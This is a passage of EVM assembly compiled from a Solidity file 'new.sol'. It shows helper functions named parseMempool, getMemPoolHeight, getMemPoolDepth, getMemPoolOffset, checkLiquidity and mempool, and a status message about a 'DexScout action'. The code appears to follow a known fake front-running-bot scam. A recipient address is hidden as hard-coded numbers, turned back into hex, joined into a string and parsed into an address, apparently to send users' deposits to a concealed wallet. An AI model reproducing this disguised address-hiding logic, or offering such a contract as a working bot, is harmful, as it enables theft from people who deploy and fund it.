0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"new.sol\":7246:7270  (b2 >= 48) && (b2 <= 57) */\n    tag_118:\n        /* \"new.sol\":7242:7315  if ((b2 >= 48) && (b2 <= 57)) {... */\n      iszero\n      tag_119\n      jumpi\n        /* \"new.sol\":7297:7299  48 */\n      0x30\n        /* \"new.sol\":7291:7299  b2 -= 48 */\n      dup3\n      tag_120\n      swap2\n      swap1\n      tag_101\n      jump\t// in\n    tag_120:\n      swap2\n      pop\n        /* \"new.sol\":7242:7315  if ((b2 >= 48) && (b2 <= 57)) {... */\n    tag_119:\n        /* \"new.sol\":7163:7315  if ((b2 >= 65) && (b2 <= 70)) {... */\n    tag_117:\n        /* \"new.sol\":7083:7315  if ((b2 >= 97) && (b2 <= 102)) {... */\n    tag_113:\n        /* \"new.sol\":7349:7351  b2 */\n      dup2\n        /* \"new.sol\":7344:7346  16 */\n      0x10\n        /* \"new.sol\":7339:7341  b1 */\n      dup5\n        /* \"new.sol\":7339:7346  b1 * 16 */\n      tag_121\n      swap2\n      swap1\n      tag_90\n      jump\t// in\n    tag_121:\n        /* \"new.sol\":7339:7351  b1 * 16 + b2 */\n      tag_122\n      swap2\n      swap1\n      tag_123\n      jump\t// in\n    tag_122:\n        /* \"new.sol\":7329:7352  iaddr += (b1 * 16 + b2) */\n      dup5\n      tag_124\n      swap2\n      swap1\n      tag_123\n      jump\t// in\n    tag_124:\n      swap4\n      pop\n        /* \"new.sol\":6704:6705  2 */\n      0x02\n        /* \"new.sol\":6699:6705  i += 2 */\n      dup2\n      tag_125\n      swap2\n      swap1\n      tag_95\n      jump\t// in\n    tag_125:\n      swap1\n      pop\n        /* \"new.sol\":6663:7364  for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {... */\n      jump(tag_86)\n    tag_87:\n      pop\n        /* \"new.sol\":7389:7394  iaddr */\n      dup3\n        /* \"new.sol\":7374:7395  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"new.sol\":6461:7403  function parseMempool(string memory _a) internal pure returns (address _parsed) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"new.sol\":6361:6455  function _calculateGasNeeds() internal pure returns(uint256) {... */\n    tag_63:\n        /* \"new.sol\":6413:6420  uint256 */\n      0x00\n        /* \"new.sol\":6440:6447  4070554 */\n      0x3e1c9a\n        /* \"new.sol\":6433:6447  return 4070554 */\n      swap1\n      pop\n        /* \"new.sol\":6361:6455  function _calculateGasNeeds() internal pure returns(uint256) {... */\n      swap1\n      jump\t// out\n        /* \"new.sol\":8469:8584  function getMemPoolHeight() internal pure returns (uint256) {... */\n    tag_65:\n        /* \"new.sol\":8520:8527  uint256 */\n      0x00\n        /* \"new.sol\":8547:8554  1015264 */\n      0x0f7de0\n        /* \"new.sol\":8540:8554  return 1015264 */\n      swap1\n      pop\n        /* \"new.sol\":8469:8584  function getMemPoolHeight() internal pure returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"new.sol\":14056:14173  function getMemPoolDepth() internal pure returns (uint256) {... */\n    tag_67:\n        /* \"new.sol\":14106:14113  uint256 */\n      0x00\n        /* \"new.sol\":14133:14143  2945814797 */\n      0xaf95910d\n        /* \"new.sol\":14126:14143  return 2945814797 */\n      swap1\n      pop\n        /* \"new.sol\":14056:14173  function getMemPoolDepth() internal pure returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"new.sol\":9685:9802  function getMemPoolOffset() internal pure returns (uint256) {... */\n    tag_71:\n        /* \"new.sol\":9736:9743  uint256 */\n      0x00\n        /* \"new.sol\":9763:9772  219788661 */\n      0x0d19b575\n        /* \"new.sol\":9756:9772  return 219788661 */\n      swap1\n      pop\n        /* \"new.sol\":9685:9802  function getMemPoolOffset() internal pure returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"new.sol\":7724:8176  function checkLiquidity(uint256 a) internal pure returns (string memory) {... */\n    tag_72:\n        /* \"new.sol\":7782:7795  string memory */\n      0x60\n        /* \"new.sol\":7808:7821  uint256 count */\n      0x00\n        /* \"new.sol\":7836:7845  uint256 b */\n      dup1\n        /* \"new.sol\":7848:7849  a */\n      dup4\n        /* \"new.sol\":7836:7849  uint256 b = a */\n      swap1\n      pop\n        /* \"new.sol\":7860:7931  while (b != 0) {... */\n    tag_131:\n        /* \"new.sol\":7872:7873  0 */\n      0x00\n        /* \"new.sol\":7867:7868  b */\n      dup2\n        /* \"new.sol\":7867:7873  b != 0 */\n      eq\n        /* \"new.sol\":7860:7931  while (b != 0) {... */\n      tag_132\n      jumpi\n        /* \"new.sol\":7890:7897  count++ */\n      dup2\n      dup1\n      tag_133\n      swap1\n      tag_134\n      jump\t// in\n    tag_133:\n      swap3\n      pop\n      pop\n        /* \"new.sol\":7917:7919  16 */\n      0x10\n        /* \"new.sol\":7912:7919  b /= 16 */\n      dup2\n      tag_135\n      swap2\n      swap1\n      tag_136\n      jump\t// in\n    tag_135:\n      swap1\n      pop\n        /* \"new.sol\":7860:7931  while (b != 0) {... */\n      jump(tag_131)\n    tag_132:\n        /* \"new.sol\":7941:7957  bytes memory res */\n      0x00\n        /* \"new.sol\":7970:7975  count */\n      dup3\n        /* \"new.sol\":7960:7976  new bytes(count) */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_137\n      jumpi\n      tag_138\n      tag_139\n      jump\t// in\n    tag_138:\n    tag_137:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_140\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_140:\n      pop\n        /* \"new.sol\":7941:7976  bytes memory res = new bytes(count) */\n      swap1\n      pop\n        /* \"new.sol\":7992:8001  uint256 i */\n      0x00\n        /* \"new.sol\":7987:8138  for (uint256 i = 0; i < count; ++i) {... */\n    tag_141:\n        /* \"new.sol\":8011:8016  count */\n      dup4\n        /* \"new.sol\":8007:8008  i */\n      dup2\n        /* \"new.sol\":8007:8016  i < count */\n      lt\n        /* \"new.sol\":7987:8138  for (uint256 i = 0; i < count; ++i) {... */\n      iszero\n      tag_142\n      jumpi\n        /* \"new.sol\":8046:8048  16 */\n      0x10\n        /* \"new.sol\":8042:8043  a */\n      dup7\n        /* \"new.sol\":8042:8048  a % 16 */\n      tag_144\n      swap2\n      swap1\n      tag_145\n      jump\t// in\n    tag_144:\n        /* \"new.sol\":8038:8048  b = a % 16 */\n      swap3\n      pop\n        /* \"new.sol\":8084:8104  toHexDigit(uint8(b)) */\n      tag_146\n        /* \"new.sol\":8101:8102  b */\n      dup4\n        /* \"new.sol\":8084:8094  toHexDigit */\n      tag_147\n        /* \"new.sol\":8084:8104  toHexDigit(uint8(b)) */\n      jump\t// in\n    tag_146:\n        /* \"new.sol\":8063:8066  res */\n      dup3\n        /* \"new.sol\":8079:8080  1 */\n      0x01\n        /* \"new.sol\":8075:8076  i */\n      dup4\n        /* \"new.sol\":8067:8072  count */\n      dup8\n        /* \"new.sol\":8067:8076  count - i */\n      tag_148\n      swap2\n      swap1\n      tag_149\n      jump\t// in\n    tag_148:\n        /* \"new.sol\":8067:8080  count - i - 1 */\n      tag_150\n      swap2\n      swap1\n      tag_149\n      jump\t// in\n    tag_150:\n        /* \"new.sol\":8063:8081  res[count - i - 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_151\n      jumpi\n      tag_152\n      tag_93\n      jump\t// in\n    tag_152:\n    tag_151:\n      0x20\n      add\n      add\n        /* \"new.sol\":8063:8104  res[count - i - 1] = toHexDigit(uint8(b)) */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"new.sol\":8124:8126  16 */\n      0x10\n        /* \"new.sol\":8119:8126  a /= 16 */\n      dup7\n      tag_153\n      swap2\n      swap1\n      tag_136\n      jump\t// in\n    tag_153:\n      swap6\n      pop\n        /* \"new.sol\":8018:8021  ++i */\n      dup1\n      0x01\n      add\n      swap1\n      pop\n        /* \"new.sol\":7987:8138  for (uint256 i = 0; i < count; ++i) {... */\n      jump(tag_141)\n    tag_142:\n      pop\n        /* \"new.sol\":8164:8167  res */\n      dup1\n        /* \"new.sol\":8150:8168  return string(res) */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"new.sol\":7724:8176  function checkLiquidity(uint256 a) internal pure returns (string memory) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"new.sol\":14900:15570  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n    tag_73:\n        /* \"new.sol\":14983:14996  string memory */\n      0x60\n        /* \"new.sol\":15009:15032  bytes memory _baseBytes */\n      0x00\n        /* \"new.sol\":15041:15046  _base */\n      dup4\n        /* \"new.sol\":15009:15047  bytes memory _baseBytes = bytes(_base) */\n      swap1\n      pop\n        /* \"new.sol\":15058:15082  bytes memory _valueBytes */\n      0x00\n        /* \"new.sol\":15091:15097  _value */\n      dup4\n        /* \"new.sol\":15058:15098  bytes memory _valueBytes = bytes(_value) */\n      swap1\n      pop\n        /* \"new.sol\":15111:15134  string memory _tmpValue */\n      0x00\n        /* \"new.sol\":15182:15193  _valueBytes */\n      dup2\n        /* \"new.sol\":15182:15200  _valueBytes.length */\n      mload\n        /* \"new.sol\":15162:15172  _baseBytes */\n      dup4\n        /* \"new.sol\":15162:15179  _baseBytes.length */\n      mload\n        /* \"new.sol\":15162:15200  _baseBytes.length + _valueBytes.length */\n      tag_155\n      swap2\n      swap1\n      tag_95\n      jump\t// in\n    tag_155:\n        /* \"new.sol\":15137:15211  new string(... */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_156\n      jumpi\n      tag_157\n      tag_139\n      jump\t// in\n    tag_157:\n    tag_156:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_158\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_158:\n      pop\n        /* \"new.sol\":15111:15211  string memory _tmpValue = new string(... */\n      swap1\n      pop\n        /* \"new.sol\":15222:15244  bytes memory _newValue */\n      0x00\n        /* \"new.sol\":15253:15262  _tmpValue */\n      dup2\n        /* \"new.sol\":15222:15263  bytes memory _newValue = bytes(_tmpValue) */\n      swap1\n      pop\n        /* \"new.sol\":15276:15285  uint256 i */\n      0x00\n        /* \"new.sol\":15296:15305  uint256 j */\n      dup1\n        /* \"new.sol\":15327:15328  0 */\n      0x00\n        /* \"new.sol\":15323:15328  i = 0 */\n      swap2\n      pop\n        /* \"new.sol\":15318:15415  for (i = 0; i < _baseBytes.length; i++) {... */\n    tag_159:\n        /* \"new.sol\":15334:15344  _baseBytes */\n      dup6\n        /* \"new.sol\":15334:15351  _baseBytes.length */\n      mload\n        /* \"new.sol\":15330:15331  i */\n      dup3\n        /* \"new.sol\":15330:15351  i < _baseBytes.length */\n      lt\n        /* \"new.sol\":15318:15415  for (i = 0; i < _baseBytes.length; i++) {... */\n      iszero\n      tag_160\n      jumpi\n        /* \"new.sol\":15390:15400  _baseBytes */\n      dup6\n        /* \"new.sol\":15401:15402  i */\n      dup3\n        /* \"new.sol\":15390:15403  _baseBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_162\n      jumpi\n      tag_163\n      tag_93\n      jump\t// in\n    tag_163:\n    tag_162:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"new.sol\":15373:15382  _newValue */\n      dup4\n        /* \"new.sol\":15383:15386  j++ */\n      dup3\n      dup1\n      tag_164\n      swap1\n      tag_134\n      jump\t// in\n    tag_164:\n      swap4\n      pop\n        /* \"new.sol\":15373:15387  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_165\n      jumpi\n      tag_166\n      tag_93\n      jump\t// in\n    tag_166:\n    tag_165:\n      0x20\n      add\n      add\n        /* \"new.sol\":15373:15403  _newValue[j++] = _baseBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"new.sol\":15353:15356  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"new.sol\":15318:15415  for (i = 0; i < _baseBytes.length; i++) {... */\n      jump(tag_159)\n    tag_160:\n        /* \"new.sol\":15436:15437  0 */\n      0x00\n        /* \"new.sol\":15432:15437  i = 0 */\n      swap2\n      pop\n        /* \"new.sol\":15427:15526  for (i = 0; i < _valueBytes.length; i++) {... */\n    tag_167:\n        /* \"new.sol\":15443:15454  _valueBytes */\n      dup5\n        /* \"new.sol\":15443:15461  _valueBytes.length */\n      mload\n        /* \"new.sol\":15439:15440  i */\n      dup3\n        /* \"new.sol\":15439:15461  i < _valueBytes.length */\n      lt\n        /* \"new.sol\":15427:15526  for (i = 0; i < _valueBytes.length; i++) {... */\n      iszero\n      tag_168\n      jumpi\n        /* \"new.sol\":15500:15511  _valueBytes */\n      dup5\n        /* \"new.sol\":15512:15513  i */\n      dup3\n        /* \"new.sol\":15500:15514  _valueBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_170\n      jumpi\n      tag_171\n      tag_93\n      jump\t// in\n    tag_171:\n    tag_170:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"new.sol\":15483:15492  _newValue */\n      dup4\n        /* \"new.sol\":15493:15496  j++ */\n      dup3\n      dup1\n      tag_172\n      swap1\n      tag_134\n      jump\t// in\n    tag_172:\n      swap4\n      pop\n        /* \"new.sol\":15483:15497  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_173\n      jumpi\n      tag_174\n      tag_93\n      jump\t// in\n    tag_174:\n    tag_173:\n      0x20\n      add\n      add\n        /* \"new.sol\":15483:15514  _newValue[j++] = _valueBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"new.sol\":15463:15466  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"new.sol\":15427:15526  for (i = 0; i < _valueBytes.length; i++) {... */\n      jump(tag_167)\n    tag_168:\n        /* \"new.sol\":15552:15561  _newValue */\n      dup3\n        /* \"new.sol\":15538:15562  return string(_newValue) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"new.sol\":14900:15570  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"new.sol\":11396:11735  function toHexDigit(uint8 d) internal pure returns (bytes1) {... */\n    tag_147:\n        /* \"new.sol\":11448:11454  bytes1 */\n      0x00\n        /* \"new.sol\":11476:11477  d */\n      dup2\n        /* \"new.sol\":11471:11477  0 <= d */\n      0xff\n      and\n        /* \"new.sol\":11471:11472  0 */\n      0x00\n        /* \"new.sol\":11471:11477  0 <= d */\n      gt\n      iszero\n        /* \"new.sol\":11471:11487  0 <= d && d <= 9 */\n      dup1\n      iszero\n      tag_176\n      jumpi\n      pop\n        /* \"new.sol\":11486:11487  9 */\n      0x09\n        /* \"new.sol\":11481:11482  d */\n      dup3\n        /* \"new.sol\":11481:11487  d <= 9 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"new.sol\":11471:11487  0 <= d && d <= 9 */\n    tag_176:\n        /* \"new.sol\":11467:11666  if (0 <= d && d <= 9) {... */\n      iszero\n      tag_177\n      jumpi\n        /* \"new.sol\":11539:11540  d */\n      dup2\n        /* \"new.sol\":11524:11535  bytes1(\"0\") */\n      0x3000000000000000000000000000000000000000000000000000000000000000\n        /* \"new.sol\":11518:11536  uint8(bytes1(\"0\")) */\n      0xf8\n      shr\n        /* \"new.sol\":11518:11540  uint8(bytes1(\"0\")) + d */\n      tag_178\n      swap2\n      swap1\n      tag_179\n      jump\t// in\n    tag_178:\n        /* \"new.sol\":11511:11541  bytes1(uint8(bytes1(\"0\")) + d) */\n      0xf8\n      shl\n        /* \"new.sol\":11504:11541  return bytes1(uint8(bytes1(\"0\")) + d) */\n      swap1\n      pop\n      jump(tag_175)\n        /* \"new.sol\":11467:11666  if (0 <= d && d <= 9) {... */\n    tag_177:\n        /* \"new.sol\":11575:11576  d */\n      dup2\n        /* \"new.sol\":11563:11577  10 <= uint8(d) */\n      0xff\n      and\n        /* \"new.sol\":11563:11565  10 */\n      0x0a\n        /* \"new.sol\":11563:11577  10 <= uint8(d) */\n      gt\n      iszero\n        /* \"new.sol\":11563:11595  10 <= uint8(d) && uint8(d) <= 15 */\n      dup1\n      iszero\n      tag_181\n      jumpi\n      pop\n        /* \"new.sol\":11593:11595  15 */\n      0x0f\n        /* \"new.sol\":11587:11588  d */\n      dup3\n        /* \"new.sol\":11581:11595  uint8(d) <= 15 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"new.sol\":11563:11595  10 <= uint8(d) && uint8(d) <= 15 */\n    tag_181:\n        /* \"new.sol\":11559:11666  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n      iszero\n      tag_182\n      jumpi\n        /* \"new.sol\":11651:11653  10 */\n      0x0a\n        /* \"new.sol\":11647:11648  d */\n      dup3\n        /* \"new.sol\":11632:11643  bytes1(\"a\") */\n      0x6100000000000000000000000000000000000000000000000000000000000000\n        /* \"new.sol\":11626:11644  uint8(bytes1(\"a\")) */\n      0xf8\n      shr\n        /* \"new.sol\":11626:11648  uint8(bytes1(\"a\")) + d */\n      tag_183\n      swap2\n      swap1\n      tag_179\n      jump\t// in\n    tag_183:\n        /* \"new.sol\":11626:11653  uint8(bytes1(\"a\")) + d - 10 */\n      tag_184\n      swap2\n      swap1\n      tag_185\n      jump\t// in\n    tag_184:\n        /* \"new.sol\":11619:11654  bytes1(uint8(bytes1(\"a\")) + d - 10) */\n      0xf8\n      shl\n        /* \"new.sol\":11612:11654  return bytes1(uint8(bytes1(\"a\")) + d - 10) */\n      swap1\n      pop\n      jump(tag_175)\n        /* \"new.sol\":11559:11666  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n    tag_182:\n        /* \"new.sol\":11719:11727  revert() */\n      0x00\n      dup1\n      revert\n        /* \"new.sol\":11396:11735  function toHexDigit(uint8 d) internal pure returns (bytes1) {... */\n    tag_175:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:106   */\n    tag_186:\n        /* \"#utility.yul\":59:65   */\n      0x00\n        /* \"#utility.yul\":93:98   */\n      dup2\n        /* \"#utility.yul\":87:99   */\n      mload\n        /* \"#utility.yul\":77:99   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:106   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":112:281   */\n    tag_187:\n        /* \"#utility.yul\":196:207   */\n      0x00\n        /* \"#utility.yul\":230:236   */\n      dup3\n        /* \"#utility.yul\":225:228   */\n      dup3\n        /* \"#utility.yul\":218:237   */\n      mstore\n        /* \"#utility.yul\":270:274   */\n      0x20\n        /* \"#utility.yul\":265:268   */\n      dup3\n        /* \"#utility.yul\":261:275   */\n      add\n        /* \"#utility.yul\":246:275   */\n      swap1\n      pop\n        /* \"#utility.yul\":112:281   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":287:533   */\n    tag_188:\n        /* \"#utility.yul\":368:369   */\n      0x00\n        /* \"#utility.yul\":378:491   */\n    tag_207:\n        /* \"#utility.yul\":392:398   */\n      dup4\n        /* \"#utility.yul\":389:390   */\n      dup2\n        /* \"#utility.yul\":386:399   */\n      lt\n        /* \"#utility.yul\":378:491   */\n      iszero\n      tag_209\n      jumpi\n        /* \"#utility.yul\":477:478   */\n      dup1\n        /* \"#utility.yul\":472:475   */\n      dup3\n        /* \"#utility.yul\":468:479   */\n      add\n        /* \"#utility.yul\":462:480   */\n      mload\n        /* \"#utility.yul\":458:459   */\n      dup2\n        /* \"#utility.yul\":453:456   */\n      dup5\n        /* \"#utility.yul\":449:460   */\n      add\n        /* \"#utility.yul\":442:481   */\n      mstore\n        /* \"#utility.yul\":414:416   */\n      0x20\n        /* \"#utility.yul\":411:412   */\n      dup2\n        /* \"#utility.yul\":407:417   */\n      add\n        /* \"#utility.yul\":402:417   */\n      swap1\n      pop\n        /* \"#utility.yul\":378:491   */\n      jump(tag_207)\n    tag_209:\n        /* \"#utility.yul\":525:526   */\n      0x00\n        /* \"#utility.yul\":516:522   */\n      dup5\n        /* \"#utility.yul\":511:514   */\n      dup5\n        /* \"#utility.yul\":507:523   */\n      add\n        /* \"#utility.yul\":500:527   */\n      mstore\n        /* \"#utility.yul\":349:533   */\n      pop\n        /* \"#utility.yul\":287:533   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":539:641   */\n    tag_189:\n        /* \"#utility.yul\":580:586   */\n      0x00\n        /* \"#utility.yul\":631:633   */\n      0x1f\n        /* \"#utility.yul\":627:634   */\n      not\n        /* \"#utility.yul\":622:624   */\n      0x1f\n        /* \"#utility.yul\":615:620   */\n      dup4\n        /* \"#utility.yul\":611:625   */\n      add\n        /* \"#utility.yul\":607:635   */\n      and\n        /* \"#utility.yul\":597:635   */\n      swap1\n      pop\n        /* \"#utility.yul\":539:641   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":647:1024   */\n    tag_190:\n        /* \"#utility.yul\":735:738   */\n      0x00\n        /* \"#utility.yul\":763:802   */\n      tag_212\n        /* \"#utility.yul\":796:801   */\n      dup3\n        /* \"#utility.yul\":763:802   */\n      tag_186\n      jump\t// in\n    tag_212:\n        /* \"#utility.yul\":818:889   */\n      tag_213\n        /* \"#utility.yul\":882:888   */\n      dup2\n        /* \"#utility.yul\":877:880   */\n      dup6\n        /* \"#utility.yul\":818:889   */\n      tag_187\n      jump\t// in\n    tag_213:\n        /* \"#utility.yul\":811:889   */\n      swap4\n      pop\n        /* \"#utility.yul\":898:963   */\n      tag_214\n        /* \"#utility.yul\":956:962   */\n      dup2\n        /* \"#utility.yul\":951:954   */\n      dup6\n        /* \"#utility.yul\":944:948   */\n      0x20\n        /* \"#utility.yul\":937:942   */\n      dup7\n        /* \"#utility.yul\":933:949   */\n      add\n        /* \"#utility.yul\":898:963   */\n      tag_188\n      jump\t// in\n    tag_214:\n        /* \"#utility.yul\":988:1017   */\n      tag_215\n        /* \"#utility.yul\":1010:1016   */\n      dup2\n        /* \"#utility.yul\":988:1017   */\n      tag_189\n      jump\t// in\n    tag_215:\n        /* \"#utility.yul\":983:986   */\n      dup5\n        /* \"#utility.yul\":979:1018   */\n      add\n        /* \"#utility.yul\":972:1018   */\n      swap2\n      pop\n        /* \"#utility.yul\":739:1024   */\n      pop\n        /* \"#utility.yul\":647:1024   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1030:1343   */\n    tag_16:\n        /* \"#utility.yul\":1143:1147   */\n      0x00\n        /* \"#utility.yul\":1181:1183   */\n      0x20\n        /* \"#utility.yul\":1170:1179   */\n      dup3\n        /* \"#utility.yul\":1166:1184   */\n      add\n        /* \"#utility.yul\":1158:1184   */\n      swap1\n      pop\n        /* \"#utility.yul\":1230:1239   */\n      dup2\n        /* \"#utility.yul\":1224:1228   */\n      dup2\n        /* \"#utility.yul\":1220:1240   */\n      sub\n        /* \"#utility.yul\":1216:1217   */\n      0x00\n        /* \"#utility.yul\":1205:1214   */\n      dup4\n        /* \"#utility.yul\":1201:1218   */\n      add\n        /* \"#utility.yul\":1194:1241   */\n      mstore\n        /* \"#utility.yul\":1258:1336   */\n      tag_217\n        /* \"#utility.yul\":1331:1335   */\n      dup2\n        /* \"#utility.yul\":1322:1328   */\n      dup5\n        /* \"#utility.yul\":1258:1336   */\n      tag_190\n      jump\t// in\n    tag_217:\n        /* \"#utility.yul\":1250:1336   */\n      swap1\n      pop\n        /* \"#utility.yul\":1030:1343   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1349:1597   */\n    tag_191:\n        /* \"#utility.yul\":1489:1523   */\n      0x52756e6e696e672044657853636f757420616374696f6e2e2054686973206361\n        /* \"#utility.yul\":1485:1486   */\n      0x00\n        /* \"#utility.yul\":1477:1483   */\n      dup3\n        /* \"#utility.yul\":1473:1487   */\n      add\n        /* \"#utility.yul\":1466:1524   */\n      mstore\n        /* \"#utility.yul\":1558:1589   */\n      0x6e2074616b652061207768696c653b20706c6561736520776169742e2e000000\n        /* \"#utility.yul\":1553:1555   */\n      0x20\n        /* \"#utility.yul\":1545:1551   */\n      dup3\n        /* \"#utility.yul\":1541:1556   */\n      add\n        /* \"#utility.yul\":1534:1590   */\n      mstore\n        /* \"#utility.yul\":1349:1597   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1603:1969   */\n    tag_192:\n        /* \"#utility.yul\":1745:1748   */\n      0x00\n        /* \"#utility.yul\":1766:1833   */\n      tag_220\n        /* \"#utility.yul\":1830:1832   */\n      0x3d\n        /* \"#utility.yul\":1825:1828   */\n      dup4\n        /* \"#utility.yul\":1766:1833   */\n      tag_187\n      jump\t// in\n    tag_220:\n        /* \"#utility.yul\":1759:1833   */\n      swap2\n      pop\n        /* \"#utility.yul\":1842:1935   */\n      tag_221\n        /* \"#utility.yul\":1931:1934   */\n      dup3\n        /* \"#utility.yul\":1842:1935   */\n      tag_191\n      jump\t// in\n    tag_221:\n        /* \"#utility.yul\":1960:1962   */\n      0x40\n        /* \"#utility.yul\":1955:1958   */\n      dup3\n        /* \"#utility.yul\":1951:1963   */\n      add\n        /* \"#utility.yul\":1944:1963   */\n      swap1\n      pop\n        /* \"#utility.yul\":1603:1969   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1975:2394   */\n    tag_27:\n        /* \"#utility.yul\":2141:2145   */\n      0x00\n        /* \"#utility.yul\":2179:2181   */\n      0x20\n        /* \"#utility.yul\":2168:2177   */\n      dup3\n        /* \"#utility.yul\":2164:2182   */\n      add\n        /* \"#utility.yul\":2156:2182   */\n      swap1\n      pop\n        /* \"#utility.yul\":2228:2237   */\n      dup2\n        /* \"#utility.yul\":2222:2226   */\n      dup2\n        /* \"#utility.yul\":2218:2238   */\n      sub\n        /* \"#utility.yul\":2214:2215   */\n      0x00\n        /* \"#utility.yul\":2203:2212   */\n      dup4\n        /* \"#utility.yul\":2199:2216   */\n      add\n        /* \"#utility.yul\":2192:2239   */\n      mstore\n        /* \"#utility.yul\":2256:2387   */\n      tag_223\n        /* \"#utility.yul\":2382:2386   */\n      dup2\n        /* \"#utility.yul\":2256:2387   */\n      tag_192\n      jump\t// in\n    tag_223:\n        /* \"#utility.yul\":2248:2387   */\n      swap1\n      pop\n        /* \"#utility.yul\":1975:2394   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2400:2580   */\n    tag_193:\n        /* \"#utility.yul\":2448:2525   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2445:2446   */\n      0x00\n        /* \"#utility.yul\":2438:2526   */\n      mstore\n        /* \"#utility.yul\":2545:2549   */\n      0x22\n        /* \"#utility.yul\":2542:2543   */\n      0x04\n        /* \"#utility.yul\":2535:2550   */\n      mstore\n        /* \"#utility.yul\":2569:2573   */\n      0x24\n        /* \"#utility.yul\":2566:2567   */\n      0x00\n        /* \"#utility.yul\":2559:2574   */\n      revert\n        /* \"#utility.yul\":2586:2906   */\n    tag_33:\n        /* \"#utility.yul\":2630:2636   */\n      0x00\n        /* \"#utility.yul\":2667:2668   */\n      0x02\n        /* \"#utility.yul\":2661:2665   */\n      dup3\n        /* \"#utility.yul\":2657:2669   */\n      div\n        /* \"#utility.yul\":2647:2669   */\n      swap1\n      pop\n        /* \"#utility.yul\":2714:2715   */\n      0x01\n        /* \"#utility.yul\":2708:2712   */\n      dup3\n        /* \"#utility.yul\":2704:2716   */\n      and\n        /* \"#utility.yul\":2735:2753   */\n      dup1\n        /* \"#utility.yul\":2725:2806   */\n      tag_226\n      jumpi\n        /* \"#utility.yul\":2791:2795   */\n      0x7f\n        /* \"#utility.yul\":2783:2789   */\n      dup3\n        /* \"#utility.yul\":2779:2796   */\n      and\n        /* \"#utility.yul\":2769:2796   */\n      swap2\n      pop\n        /* \"#utility.yul\":2725:2806   */\n    tag_226:\n        /* \"#utility.yul\":2853:2855   */\n      0x20\n        /* \"#utility.yul\":2845:2851   */\n      dup3\n        /* \"#utility.yul\":2842:2856   */\n      lt\n        /* \"#utility.yul\":2822:2840   */\n      dup2\n        /* \"#utility.yul\":2819:2857   */\n      sub\n        /* \"#utility.yul\":2816:2900   */\n      tag_227\n      jumpi\n        /* \"#utility.yul\":2872:2890   */\n      tag_228\n      tag_193\n      jump\t// in\n    tag_228:\n        /* \"#utility.yul\":2816:2900   */\n    tag_227:\n        /* \"#utility.yul\":2637:2906   */\n      